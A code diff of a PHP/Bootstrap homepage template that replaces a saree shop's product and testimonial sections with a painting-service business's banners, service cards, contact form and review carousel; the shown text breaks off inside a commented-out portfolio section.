+<div class="modal fade" id="exampleModalToggle" tabindex="-1" aria-labelledby="exampleModalToggleLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-xl"><!-- Extra large modal -->
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 class="modal-title text-danger fw-bold" id="exampleModalToggleLabel">Service Details</h3>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body" id="service-details">
+        <div class="text-center py-5">
+          <div class="spinner-border text-danger" role="status"></div>
+          <p class="mt-3">Loading...</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+         <!--=====================================
+                    BANNER PART START
+        =======================================-->
+        <div id="myCarousel" class="carousel slide" data-bs-ride="carousel">
+
+          <!-- Indicators -->
+          <div class="carousel-indicators">
+            <?php
+            $bansql = "SELECT * FROM `banner` WHERE `du_id` = 1 AND `ban_status` = 1";
+            $banquery = mysqli_query($conn, $bansql);
+            $i = 0;
+            while ($banrow = mysqli_fetch_array($banquery)) {
+                $active = ($i == 0) ? 'class="active"' : '';
+                echo '<button type="button" data-bs-target="#myCarousel" data-bs-slide-to="'.$i.'" '.$active.'></button>';
+                $i++;
+            }
+            // Reset result pointer for next loop
+            mysqli_data_seek($banquery, 0);
+            ?>
+          </div>
+
+          <!-- Carousel Items -->
+          <div class="carousel-inner">
+            <?php
+            $j = 0;
+            while ($banrow = mysqli_fetch_array($banquery)) {
+                $active = ($j == 0) ? 'active' : '';
+            ?>
+            <div class="carousel-item <?php echo $active; ?>">
+              <img src="admin/<?php echo htmlspecialchars($banrow['ban_image']); ?>" class="d-block w-100 promo-img" alt="Slide <?php echo $j+1; ?>">
+            </div>
+            <?php
+                $j++;
+            }
+            ?>
+          </div>
+
+          <!-- Controls -->
+          <button class="carousel-control-prev" type="button" data-bs-target="#myCarousel" data-bs-slide="prev">
+            <span class="carousel-control-prev-icon"></span>
+          </button>
+          <button class="carousel-control-next" type="button" data-bs-target="#myCarousel" data-bs-slide="next">
+            <span class="carousel-control-next-icon"></span>
+          </button>
+
+        </div>
+        <!--=====================================
+                    BANNER PART END
+        =======================================-->
+
+         <!-- slider area start -->
+         <!-- <section class="slider__area">
+            <div class="slider__active swiper-container">
+               <div class="swiper-wrapper">
+                  <div class="single-slider swiper-slide slider__height slider__overlay d-flex align-items-center" data-background="admin/<?php echo $banrow['ban_image']; ?>" style="width: 100%; height: 100%; object-fit: contain; display: block;">
+                     <div class="container">
+                        <div class="row">
+                           <div class="col-xxl-12">
+                              <div class="slider__content text-center">
+                                 <span data-animation="fadeInUp" data-delay=".2s">20 Years Of Experience</span>
+                                 <h2 class="slider__title" data-animation="fadeInUp" data-delay=".4s">Painting Service</h2>
+
+                                 <div class="slider__btn" data-animation="fadeInUp" data-delay=".6s">
+                                    <a href ="app/contact.php" class="r-btn r-btn-green mr-10">get started <i class="far fa-arrow-right"></i></a>
+                                    <a href ="app/services.php" class="r-btn">our services<i class="far fa-arrow-right"></i></a>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="slider__nav">
+                  <div class="swiper-button-prev swiper-slider-nav">
+                     <i class="fal fa-angle-left"></i>
+                  </div>
+                  <div class="swiper-button-next swiper-slider-nav">
+                     <i class="far fa-angle-right"></i>
+                  </div>
+               </div>
+            </div>
+         </section> -->
+         <!-- slider area end -->
+
+         <!-- blog area start -->
+         <section class="blog__area grey-bg pt-50 pb-50">
+            <div class="container">
+               <div class="row">
+                  <div class="col-xxl-6 offset-xxl-3 col-xl-6 offset-xl-3 col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                     <div class="section__title-wrapper mb-70 text-center">
+                        <span class="section__title-pre center">Services</span>
+                        <h2 class="section__title">Our Painting Services</h2>
+                     </div>
+                  </div>
+               </div>
+               <div class="row">
+                  <?php
+                  $csql = "SELECT * FROM category WHERE du_id = 1 AND cstatus = 1";
+                  $cquery = mysqli_query($conn, $csql);
+                  while ($crow = mysqli_fetch_array($cquery))
+                  {
+                     $cid = $crow['cat_id'];
+                     $countsql = "SELECT COUNT(*) AS itemCount FROM `item` WHERE `du_id` = 1 AND `status` =  1 AND `category` = $cid";
+                     $countquery = mysqli_query($conn, $countsql);
+                     $countrow = mysqli_fetch_assoc($countquery);
+                     $item_count = $countrow['itemCount'];
+                  ?>
+                  <div class="col-xxl-3 col-xl-3 col-lg-6 col-md-6">
+                     <div class="blog__item white-bg mb-30">
+                        <div class="blog__thumb fix w-img">
+                           <a href="app/projects.php?id=<?php echo $cid; ?>">
+                              <img src="admin/<?php echo $crow['cimage']; ?>" alt="">
+                           </a>
+                        </div>
+                        <div class="blog__content p-relative">
+                           <!-- <div class="blog__meta text-center">
+                              <span class="author">
+                                 <a href="#">Anbin Vannangal</a>
+                              </span>
+                           </div> -->
+                           <!-- <div class="blog__meta">
+                              <span class="date">
+                                 <span>Latest</span>
+                              </span>
+                           </div> -->
+                           <h3 class="blog__title text-center">
+                              <a href="app/projects.php?id=<?php echo $cid; ?>"><?php echo $crow['cname']; ?></a>
+                           </h3>
+                        <div class="text-center">
+                           <button class="btn btn-danger view-service text-center" data-id="<?php echo $cid; ?>" data-bs-toggle="modal" data-bs-target="#exampleModalToggle">
+                              Read More <i class="far fa-arrow-right"></i>
+                           </button>
+                        </div>
+                        </div>
+                     </div>
+                  </div>
+               <?php } ?>
+               </div>
+            </div>
+         </section>
+         <!-- blog area end -->
+
+         <!-- why area start -->
+         <section class="why__area pink-bg p-relative z-index-1 pt-50 pb-50">
+            <div class="contact__bg" data-background="app/assets/img/contact/map.png"></div>
+            <div class="container-fluid">
+               <div class="row">
+                  <div class="col-xxl-4 offset-xxl-2 col-xl-5">
+                     <div class="why__thumb m-img ml-35">
+                        <img src="app/assets/img/why/why-1.jpg" style="border-radius: 40px !important;" alt="">
+                     </div>
+                  </div>
+                  <div class="col-xxl-5 col-xl-7 col-lg-8">
+                     <div class="why__wrapper pt-125 pb-125 pl-125">
+                        <div class="section__title-wrapper mb-30">
+                           <span class="section__title-pre section__title-pre-white">Know About Us</span>
+                           <h2 class="section__title section__title-pre-white">Why Choose Us?</h2>
+                        </div>
+
+                        <div class="services__details-features">
+                           <div class="row">
+                              <div class="col-xxl-6 col-xl-6 col-lg-6 col-md-6">
+                                 <ul>
+                                    <li class="d-flex align-items-center">
+                                       <div class="icon mr-15">
+                                          <i class="far fa-check"></i>
+                                       </div>
+                                       <div class="text">
+                                          <h5><strong>Expert Team:</strong> Skilled painters with 20 years of experience</h5>
+                                       </div>
+                                    </li>
+                                    <li class="d-flex align-items-center">
+                                       <div class="icon mr-15">
+                                          <i class="far fa-check"></i>
+                                       </div>
+                                       <div class="text">
+                                          <h5><strong>Premium Quality:</strong> Only top-grade paints & materials used</h5>
+                                       </div>
+                                    </li>
+                                    <li class="d-flex align-items-center">
+                                       <div class="icon mr-15">
+                                          <i class="far fa-check"></i>
+                                       </div>
+                                       <div class="text">
+                                          <h5><strong>Creative Options:</strong> From classic finishes to trendy textures</h5>
+                                       </div>
+                                    </li>
+                                 </ul>
+                              </div>
+                              <div class="col-xxl-6 col-xl-6 col-lg-6 col-md-6">
+                                 <ul>
+                                    <li class="d-flex align-items-center">
+                                       <div class="icon mr-15">
+                                          <i class="far fa-check"></i>
+                                       </div>
+                                       <div class="text">
+                                          <h5><strong>Warranty Backed:</strong> Long-lasting protection & guaranteed finish</h5>
+                                       </div>
+                                    </li>
+                                    <li class="d-flex align-items-center">
+                                       <div class="icon mr-15">
+                                          <i class="far fa-check"></i>
+                                       </div>
+                                       <div class="text">
+                                          <h5><strong>Customer-Centric:</strong> We listen, plan, and deliver exactly what you want</h5>
+                                       </div>
+                                    </li>
+                                 </ul>
+                              </div>
+                           </div>
+                        </div>
+
+                        <div class="why__inner d-sm-flex align-items-center mt-30">
+                           <div class="why__item text-center" style="border-radius: 40px !important;">
+                              <div class="why__icon mb-15">
+                                 <img src="app/assets/img/why/icon/why-icon-1.png" alt="">
+                              </div>
+                              <div class="why__content">
+                                 <h4 class="why__title">PDCA Certified Member</h4>
+                              </div>
+                           </div>
+                           <div class="why__item text-center" style="border-radius: 40px !important;">
+                              <div class="why__icon mb-15">
+                                 <img src="app/assets/img/why/icon/why-icon-2.png" alt="">
+                              </div>
+                              <div class="why__content">
+                                 <h4 class="why__title">Flexible Schedule Options.</h4>
+                              </div>
+                           </div>
+                           <div class="why__item text-center" style="border-radius: 40px !important;">
+                              <div class="why__icon mb-15">
+                                 <img src="app/assets/img/why/icon/why-icon-3.png" alt="">
+                              </div>
+                              <div class="why__content">
+                                 <h4 class="why__title">Eco Friendly & Clean Work Area</h4>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- why area end -->
+
+         <!-- features area start -->
+         <section class="features__area pt-50 pb-50" data-background="app/assets/img/features/features-bg.jpg">
+            <div class="container">
+               <div class="row">
+                  <div class="col-xxl-5 col-xl-6 col-lg-7 col-md-10">
+                     <div class="features__wrapper">
+                        <div class="section__title-wrapper">
+                           <div class="section__title-wrapper mb-40">
+                              <span class="section__title-pre">What We Do</span>
+                              <h2 class="section__title">Beign Us To Made Your Dream Painting</h2>
+                           </div>
+                           <div class="features__inner">
+                              <div class="features__item d-sm-flex align-items-center pr-40">
+                                 <div class="features__icon mr-30">
+                                    <span>
+                                       <img src="app/assets/img/features/icon/fea-1.png" alt="">
+                                    </span>
+                                 </div>
+                                 <div class="features__content">
+                                    <h3 class="features__title">Residential Painting</h3>
+                                    <p>Bring new life to your home with our expert residential painting services. Whether it’s a single room, an apartment, or an entire house, our team delivers flawless finishes with high-quality paints that last.</p>
+                                 </div>
+                              </div>
+                              <div class="features__item d-sm-flex align-items-center pr-40">
+                                 <div class="features__icon mr-30">
+                                    <span>
+                                       <img src="app/assets/img/features/icon/fea-2.png" alt="">
+                                    </span>
+                                 </div>
+                                 <div class="features__content">
+                                    <h3 class="features__title">Commercial Painting</h3>
+                                    <p>Create a lasting impression with our professional commercial painting solutions. From offices and retail stores to hotels and institutions, we provide painting services that enhance your brand image while ensuring durability and a polished look.</p>
+                                 </div>
+                              </div>
+                              <div class="features__item d-sm-flex align-items-center pr-40">
+                                 <div class="features__icon mr-30">
+                                    <span>
+                                       <img src="app/assets/img/features/icon/fea-3.png" alt="">
+                                    </span>
+                                 </div>
+                                 <div class="features__content">
+                                    <h3 class="features__title">Industrial Painting</h3>
+                                    <p>Protect and enhance your industrial spaces with our specialized industrial painting services. Perfect for factories, warehouses, and large facilities.</p>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- features area end -->
+
+          <!-- contact area start -->
+         <section class="contact__area pt-100 pb-100 green-bg-2 p-relative z-index-1 fix">
+            <div class="testimonial__bg" data-background="app/assets/img/testimonial/map.png"></div>
+            <!-- <div class="contact__bg" data-background="app/assets/img/contact/map.png"></div> -->
+            <div class="container">
+               <div class="row">
+                  <div class="col-xxl-6 col-xl-6">
+                     <div class="contact__wrapper pr-70 p-relative">
+                        <div class="section__title-wrapper mb-35">
+                           <span class="section__title-pre section__title-pre-white">Get In Touch</span>
+                           <h2 class="section__title section__title-white">Contact With us</h2>
+                        </div>
+                        <div class="contact__form">
+                           <form  method="post">
+                              <div class="contact__input">
+                                 <input type="text" name="name" placeholder="Your Full Name">
+                                 <i class="far fa-user"></i>
+                              </div>
+                              <div class="contact__input">
+                                 <input type="number" name="phone" placeholder="Your Phone Number">
+                                 <i class="fal fa-phone"></i>
+                              </div>
+                              <div class="contact__input">
+                                 <input type="email" name="email" placeholder="Your Email Address">
+                                 <i class="fal fa-envelope"></i>
+                              </div>
+                              <div class="contact__input">
+                                 <textarea name="message" placeholder="Your Message"></textarea>
+                              </div>
+                              <button type="submit" class="r-btn r-btn-white r-btn-plr-90">send message <i class="far fa-arrow-right"></i></button>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xxl-6 col-xl-6">
+                     <div class="contact__thumb">
+                        <div class="text-center pt-50 pb-50">
+                           <img src="app/assets/img/google.png" style="height: 200px; width: 200px;" alt="">
+                        </div>
+                        <div class="contact__thumb-2 text-center pb-50 m-img">
+                           <a href="https://www.google.com/search?sca_esv=340802fe2459afeb&sxsrf=AE3TifOxAcQP-Uekrlt9kJlA_AOOmLyu2Q:1755331062612&si=AMgyJEtREmoPL4P1I5IDCfuA8gybfVI2d5Uj7QMwYCZHKDZ-Ez1HGJUvyPSzKreiYFKHWeinnR-PNorNyVanfcsd6LAL33tEXzefuzSOi5HONijXdE4B4wWgge0ixiK-oNHdc1qdCyU2v_hAeCvPQozj8wg5cHd3eSyOVuZTPbtd4Vu64gp6ZyWrwrk1tHJiJwP1u4lb-TRs&q=Haptrend+Media+-+Digital+Marketing+%26+App+Development+Company+Reviews&sa=X&ved=2ahUKEwi748zj7Y6PAxU0SmwGHf_XHGgQ0bkNegQIKhAE&biw=1280&bih=585&dpr=1.5#lrd=0x6d5042f5c7b05783:0x367b07ef799bac99,3,,,," class="r-btn r-btn-white r-btn-plr-90">Review Us <i class="far fa-arrow-right"></i></a>
+                        </div>
+                        <div class="contact__thumb-2 m-img text-end">
+                           <!-- Bootstrap Testimonial Slider -->
+<div id="testimonialCarousel" class="carousel slide" data-bs-ride="carousel">
     <div class="carousel-inner">
-        <?php foreach ($banners as $i => $ban): ?>
-            <div class="carousel-item <?= $i === 0 ? 'active' : '' ?>">
-                <img src="app/<?= htmlspecialchars($ban['bimg']) ?>" class="d-block w-100 banner-img" alt="Banner">
-            </div>
-        <?php endforeach; ?>
-    </div>
-    <?php if (count($banners) > 1): ?>
-        <div class="carousel-indicators">
-            <?php foreach ($banners as $i => $ban): ?>
-                <button type="button" data-bs-target="#homeBanner" data-bs-slide-to="<?= $i ?>" class="<?= $i === 0 ? 'active' : '' ?>"></button>
-            <?php endforeach; ?>
-        </div>
-    <?php endif; ?>
-</div>
-
-<!-- New Arrivals -->
-<section class="new-arrivals mt-5">
-    <div class="container">
-        <h2 class="section-title">New Collections</h2>
-        <div class="new-arrivals-carousel">
-            <div class="slider-wrapper p-0">
-                <button class="scroll-btn left-btn" onclick="scrollNewArrivals(-350)">&#10094;</button>
-                <div class="new-arrivals-slider" id="newArrivalsSlider">
-                    <?php foreach ($new_arrivals as $product): ?>
-                        <div class="new-arrival-item">
-                            <a href="product-details.php?id=<?= (int)$product['id'] ?>" class="text-decoration-none text-dark">
-                                <div class="position-relative">
-                                    <img src="app/<?= htmlspecialchars($product['pimg'] ?? 'default-product.jpg') ?>"
-                                         class="new-arrival-img" alt="<?= htmlspecialchars($product['ptitle']) ?>">
-                                    <!-- Wishlist button (always visible, top-right) -->
-                                    <!-- Inside New Arrivals loop -->
-<div class="position-absolute top-0 end-0 p-2">
-    <button class="btn btn-wishlist <?= in_array($product['id'], $wishlist) ? 'active' : '' ?>"
-            onclick="toggleWishlist(<?= (int)$product['id'] ?>, event)">
-        <i class="bi bi-heart<?= in_array($product['id'], $wishlist) ? '-fill' : '' ?>"></i>
-    </button>
-</div>
-                                </div>
-                                <div class="new-arrival-info">
-                                    <div class="new-arrival-title"><?= htmlspecialchars($product['ptitle']) ?></div>
-                                    <div class="new-arrival-price" style="font-family:Times new Romen">₹ <?= cleanNumber(number_format($product['variant_price'], 2)) ?></div>
-                                </div>
-                            </a>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
-                <button class="scroll-btn right-btn" onclick="scrollNewArrivals(350)">&#10095;</button>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Special Collections -->
-<?php if (!empty($grouped_collections)): ?>
-    <?php foreach ($grouped_collections as $index => $collection): ?>
-    <section class="special-collections">
-        <div class="container">
-            <h2 class="section-title">✨ <?= htmlspecialchars($collection['title']) ?></h2>
-            <div class="slider-wrapper p-0">
-                <button class="scroll-btn left-btn" onclick="scrollSpecial(<?= $index ?>, -350)">&#10094;</button>
-                <div class="special-slider" id="specialSlider_<?= $index ?>">
-                    <?php foreach ($collection['products'] as $item): ?>
-                    <a href="product-details.php?id=<?= (int)$item['product_id'] ?>">
-                        <div class="special-collection-item">
-                        <div class="product-image-wrapper">
-                            <span class="discount-badge"><?= round($collection['discount']) ?>% OFF</span>
-                            <img src="app/<?= htmlspecialchars($item['pimg'] ?? 'default-product.jpg') ?>"
-                                 class="special-collection-img" alt="<?= htmlspecialchars($item['ptitle']) ?>">
-                            <div class="product-overlay">
-                                <a href="product-details.php?id=<?= (int)$item['product_id'] ?>" class="btn btn-view" title="View Details">
-                                    <i class="bi bi-eye"></i>
-                                </a>
-                                <button class="btn btn-wishlist <?= in_array($item['product_id'], $wishlist) ? 'active' : '' ?>"
-        onclick="toggleWishlist(<?= (int)$item['product_id'] ?>, event)"
-        title="<?= in_array($item['product_id'], $wishlist) ? 'Remove from Wishlist' : 'Add to Wishlist' ?>">
-    <i class="bi bi-heart<?= in_array($item['product_id'], $wishlist) ? '-fill' : '' ?>"></i>
-</button>
-                            </div>
-                        </div>
-                        <div class="special-collection-info">
-                            <h4 class="special-collection-title"><?= htmlspecialchars($item['ptitle']) ?></h4>
-                            <!-- <div>
-                                <span class="original-price">₹ <?= cleanNumber(number_format($item['original_price'], 2)) ?></span>
-                                <span class="discounted-price">₹ <?= cleanNumber(number_format($item['discounted_price'], 2)) ?></span>
-                            </div> -->
-                        </div>
-                    </div>
-                    </a>
-                    <?php endforeach; ?>
-                </div>
-                <button class="scroll-btn right-btn" onclick="scrollSpecial(<?= $index ?>, 350)">&#10095;</button>
-            </div>
-        </div>
-    </section>
-    <?php endforeach; ?>
-<?php endif; ?>
-
-<?php
-$obanner = "SELECT * FROM `tbl_offer_banner` WHERE `status` = 1 ORDER BY `id` ASC";
-$oresult = mysqli_query($conn, $obanner);
-$banners_offers = [];
-while ($row = mysqli_fetch_array($oresult, MYSQLI_ASSOC)) {
-    $banners_offers[] = $row;
-}
-$half = ceil(count($banners_offers) / 2);
-$first_half = array_slice($banners_offers, 0, $half);
-?>
-
-<!-- Offer Banners (First Half) -->
-<div class="container section-a mb-5">
-    <div class="row">
-        <?php foreach ($first_half as $banner): ?>
-            <div class="col-lg-12 offer-banner">
-                <img class="sbanner" src="app/<?= htmlspecialchars($banner['oimg']) ?>" alt="Offer Banner">
-            </div>
-        <?php endforeach; ?>
-    </div>
-</div>
-
-<!-- Sarees by Collection -->
-<section class="sarees-collection">
-    <div class="container">
-        <h2 class="section-title">SAREES COLLECTION</h2>
-        <div class="sarees-grid">
-            <?php foreach ($sarees_collections as $subcat): ?>
-                <div class="collection-card">
-                    <a href="category.php?cat=<?= (int)$sarees_category_id ?>&subcat=<?= (int)$subcat['id'] ?>" class="text-decoration-none">
-                        <img src="app/<?= htmlspecialchars($subcat['cimg']) ?>" class="collection-img" alt="<?= htmlspecialchars($subcat['title']) ?>">
-                        <div class="collection-overlay" style="font-family:'Playfair Display', serif !important;"><?= htmlspecialchars($subcat['title']) ?></div>
-                    </a>
-                </div>
-            <?php endforeach; ?>
-        </div>
-         <a href="category.php?cat=<?= (int)$sarees_category_id ?>" class="about-button mt-5" style="justify-self:center;display:block;">See More  &nbsp <i class="fa-solid fa-arrow-right"></i></a>
-    </div>
-</section>
-
-<!-- Offer Banners (Second Half) -->
-<?php
-$second_half = array_slice($banners_offers, $half);
-?>
-<div class="container section-b mt-5">
-    <div class="row">
-        <?php foreach ($second_half as $banner): ?>
-            <div class="col-lg-12 mt-30 offer-banner">
-                <img class="sbanner" src="app/<?= htmlspecialchars($banner['oimg']) ?>" alt="Offer Banner">
-            </div>
-        <?php endforeach; ?>
-    </div>
-</div>
-
-<!-- Unstitched Salwar -->
-<section class="unstitched-salwar">
-    <div class="container">
-        <h2 class="section-title">UNSTITCHED SALWAR COLLECTION</h2>
-        <div class="unstitched-grid">
-            <?php foreach ($unstitched_salwar_collections as $subcat): ?>
-                <div class="unstitched-card">
-                    <a href="category.php?cat=<?= (int)$unstitched_salwar_category_id ?>&subcat=<?= (int)$subcat['id'] ?>" class="text-decoration-none">
-                        <img src="app/<?= htmlspecialchars($subcat['cimg']) ?>" class="unstitched-img" alt="<?= htmlspecialchars($subcat['title']) ?>">
-                        <div class="unstitched-overlay" style="font-family:'Playfair Display', serif !important;"><?= htmlspecialchars($subcat['title']) ?></div>
-                    </a>
-                </div>
-            <?php endforeach; ?>
-        </div>
-    </div>
-    <a href="category.php?cat=<?= (int)$unstitched_salwar_category_id ?>" class="about-button mt-5" style="justify-self:center;display:block;">See More  &nbsp <i class="fa-solid fa-arrow-right"></i></a>
-</section>
-
-<!-- Shipping Banner -->
-<div class="container mt-30 section-b">
-    <div class="row" style="padding:10px">
-        <div class="col-lg-12 mt-30 offer-banner">
-            <img class="sbanner" src="assets/img/shippingbanner.jpg" alt="Free Shipping">
-        </div>
-    </div>
-</div>
-
-<!-- About Section -->
-<section class="about-section">
-    <div class="container">
-        <div class="about-container">
-            <div class="about-image">
-                <img src="assets/img/umayal_logo.png" alt="About Us">
-            </div>
-            <div class="about-content">
-                <h2 class="about-title">About Umayal Sarees</h2>
-                <p class="about-text">
-                    At Umayal Sarees, we understand that a saree is more than just a garment it's a symbol of grace, culture, and personal expression. Drawing inspiration from the vibrant textile traditions of South India, we curate collections that preserve the rich heritage of Indian textile artistry.
-                </p>
-                <p class="about-text">
-                    Our name, Umayal, reflects our commitment to bringing divine beauty and elegance to every woman who drapes our sarees. Each piece in our collection is carefully selected to ensure it meets our high standards of quality, authenticity, and craftsmanship.
-                </p>
-                <a href="about.php" class="about-button">Learn More</a>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Testimonials -->
-<section class="testimonials-carousel-section py-5">
-    <div class="container">
-        <h2 class="section-title">What Our Customers Say</h2>
         <?php
-        $testimonial_sql = "SELECT id, name, image, rating, review FROM tbl_testimonial WHERE status = 1 ORDER BY created_at DESC";
-        $testimonial_res = mysqli_query($conn, $testimonial_sql);
-        $testimonials = [];
-        while ($row = mysqli_fetch_assoc($testimonial_res)) {
-            $testimonials[] = $row;
+        $resql = "SELECT * FROM `review` WHERE `du_id` = 1";
+        $requery = mysqli_query($conn, $resql);
+        $isActive = true; // To set active class for the first item only
+
+        while ($rerow = mysqli_fetch_array($requery)) {
+        ?>
+            <div class="carousel-item <?php echo $isActive ? 'active' : ''; ?> text-center p-4">
+                <p class="mb-3 fst-italic section__title-white">"<?php echo $rerow['feedback']; ?>"</p>
+                <div class="d-flex justify-content-center mb-4">
+                    <?php
+                    $rating = isset($rerow['rating']) ? $rerow['rating'] : 5; // Default 5 stars
+                    for ($i = 1; $i <= 5; $i++) {
+                        if ($i <= $rating) {
+                            echo '<i class="fa fa-star text-warning"></i>';
+                        } else {
+                            echo '<i class="fa fa-star text-secondary"></i>';
+                        }
+                    }
+                    ?>
+                </div>
+                <h5 class="fw-bold section__title-white">– <?php echo $rerow['name']; ?></h5>
+            </div>
+        <?php
+            $isActive = false;
         }
         ?>
-
-        <?php if (!empty($testimonials)): ?>
-        <div class="testimonial-carousel-wrapper position-relative">
-            <div class="testimonial-carousel" id="testimonialCarousel">
-                <?php foreach ($testimonials as $index => $t): 
-                    $stars = '';
-                    for ($i = 1; $i <= 5; $i++) {
-                        $stars .= ($i <= $t['rating']) 
-                            ? '<i class="bi bi-star-fill text-warning"></i>' 
-                            : '<i class="bi bi-star text-muted"></i>';
-                    }
-                ?>
-                <div class="testimonial-slide">
-                    <div class="testimonial-card">
-                        <div class="quote-icon">
-                            <i class="bi bi-quote"></i>
-                        </div>
-                        <p class="testimonial-review"><?= htmlspecialchars($t['review']) ?></p>
-                        <div class="rating mt-2 mb-3"><?= $stars ?></div>
-                        <div class="customer-info d-flex align-items-center">
-                            <img src="app/<?= htmlspecialchars($t['image'] ?? 'assets/img/default-avatar.png') ?>" 
-                                 alt="<?= htmlspecialchars($t['name']) ?>" class="customer-avatar">
-                            <div class="ms-3">
-                                <h6 class="customer-name mb-0"><?= htmlspecialchars($t['name']) ?></h6>
-                                <small class="text-muted">Verified Customer</small>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <?php endforeach; ?>
-            </div>
-
-            <div class="carousel-indicators mt-4 d-flex justify-content-center">
-                <?php foreach ($testimonials as $i => $t): ?>
-                <button type="button" class="indicator-dot" data-index="<?= $i ?>"></button>
-                <?php endforeach; ?>
-            </div>
-
-            <button class="carousel-arrow prev-arrow" onclick="moveTestimonial(-1)">&#10094;</button>
-            <button class="carousel-arrow next-arrow" onclick="moveTestimonial(1)">&#10095;</button>
-        </div>
-        <?php else: ?>
-        <p class="text-center mt-4">No testimonials yet.</p>
-        <?php endif; ?>
     </div>
-</section>
 
-<?php include_once('layout/footer.php'); ?>
-
-<script>
-function scrollNewArrivals(amount) {
-    const slider = document.getElementById('newArrivalsSlider');
-    if (slider) {
-        slider.scrollBy({ left: amount, behavior: 'smooth' });
-    }
-}
-
-function scrollSpecial(sliderIndex, amount) {
-    const slider = document.getElementById('specialSlider_' + sliderIndex);
-    if (slider) {
-        slider.scrollBy({ left: amount, behavior: 'smooth' });
-    }
-}
+    <!-- Carousel Controls -->
+    <button class="carousel-control-prev" type="button" data-bs-target="#testimonialCarousel" data-bs-slide="prev">
+        <span class="carousel-control-prev-icon"></span>
+    </button>
+    <button class="carousel-control-next" type="button" data-bs-target="#testimonialCarousel" data-bs-slide="next">
+        <span class="carousel-control-next-icon"></span>
+    </button>
+</div>
 
 
-function toggleWishlist(productId, event) {
-    event.preventDefault();
-    const button = event.currentTarget;
-    const badge = document.getElementById('wishlistBadge');
-    let currentCount = badge ? parseInt(badge.textContent) || 0 : 0;
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- contact area end -->
 
-    button.disabled = true;
-    const originalHTML = button.innerHTML;
-    button.innerHTML = '<i class="bi bi-hourglass"></i>';
+         <!-- portfolio area start -->
+         <!-- <section class="portfolio__area portfolio__bg portfolio__padding pt-100 pb-100 pl-55 pr-55">
+            <div class="container-fluid">
+               <div class="row">
+                  <div class="col-xxl-6 offset-xxl-3 col-xl-6 offset-xl-3 col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                     <div class="section__title-wrapper mb-70 text-center">
+                        <span class="section__title-pre center">Projects</span>
+                        <h2 class="section__title">Our Latest Projects</h2>
+                     </div>
+                  </div>
+               </div>
+               <div class="row">
+                  <div class="col-xxl-4 col-xl-4 col-lg-6">
+                     <div class="portfolio__item p-relative mb-30">
+                        <div class="portfolio__thumb w-img">
+                           <img src="app/assets/img/portfolio/portfolio-1.jpg" alt="">
 
-    fetch('wishlist-toggle.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'product_id=' + productId
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            if (data.in_wishlist) {
-                button.innerHTML = '<i class="bi bi-heart-fill"></i>';
-                button.classList.add('active');
-                currentCount++;
-            } else {
-                button.innerHTML = '<i class="bi bi-heart"></i>';
-                button.classList.remove('active');
-                currentCount = Math.max(0, currentCount - 1);
-            }
+                           <div class="portfolio__plus transition-3">
+                              <a class="popup-image" href="app/assets/img/portfolio/portfolio-1.jpg">
+                                 <i class="far fa-plus"></i>
+                              </a>
+                           </div>
+                        </div>
+                        <div class="portfolio__content transition-3">
+                           <h3 class="portfolio__title">
+                              <a href="#">Painting Outside In House</a>
+                           </h3>
+                           <p>Color Painting Services</p>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xxl-4 col-xl-4 col-lg-6">
+                     <div class="portfolio__item p-relative mb-30">
+                        <div class="portfolio__thumb w-img">
+                           <img src="app/assets/img/portfolio/portfolio-2.jpg" alt="">
 
-            // ✅ Update wishlist badge
-            if (badge) {
-                badge.textContent = currentCount;
-                if (currentCount === 0) {
-                    badge.style.display = 'none';
-                }
-            } else if (currentCount > 0) {
-                // If badge doesn't exist, create it
-                const iconBlock = button.closest('.icon-blocks') || button.closest('[style*="relative"]');
-                if (iconBlock) {
-                    const newBadge = document.createElement('span');
-                    newBadge.className = 'badge';
-                    newBadge.id = 'wishlistBadge';
-                    newBadge.textContent = currentCount;
-                    iconBlock.appendChild(newBadge);
-                }
-            }
-        } else {
-            alert('Failed to update wishlist.');
-            button.innerHTML = originalHTML;
-        }
-    })
-    .catch(err => {
-        console.error('Wishlist error:', err);
-        alert('Network error.');
-        button.innerHTML = originalHTML;
-    })
-    .finally(() => {
-        button.disabled = false;
-    });
-}
+                           <div class="portfolio__plus transition-3">
+                              <a class="popup-image" href="app/assets/img/portfolio/portfolio-2.jpg">
+                                 <i class="far fa-plus"></i>
+                              </a>
+                           </div>
+                        </div>
+                        <div class="portfolio__content transition-3">
+                           <h3 class="portfolio__title">
+                              <a href="#">Painting Outside In House</a>
+                           </h3>
+                           <p>Color Painting Services</p>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xxl-4 col-xl-4 col-lg-6">
+                     <div class="portfolio__item p-relative mb-30">
+                        <div class="portfolio__thumb w-img">
+                           <img src="app/assets/img/portfolio/portfolio-3.jpg" alt="">
 
-// Testimonial Carousel
-document.addEventListener('DOMContentLoaded', function () {
-    const carousel = document.getElementById('testimonialCarousel');
-    const dots = document.querySelectorAll('.indicator-dot');
-    const totalSlides = <?= count($testimonials) ?>;
-    let currentIndex = 0;
-    let autoSlideInterval;
+                           <div class="portfolio__plus transition-3">
+                              <a class="popup-image" href="app/assets/img/portfolio/portfolio-3.jpg">
+                                 <i class="far fa-plus"></i>
+                              </a>
+                           </div>
+                        </div>
+                        <div class="portfolio__content transition-3">
+                           <h3 class="portfolio__title">
+                              <a href="#">Painting Outside In House</a>
+                           </h3>
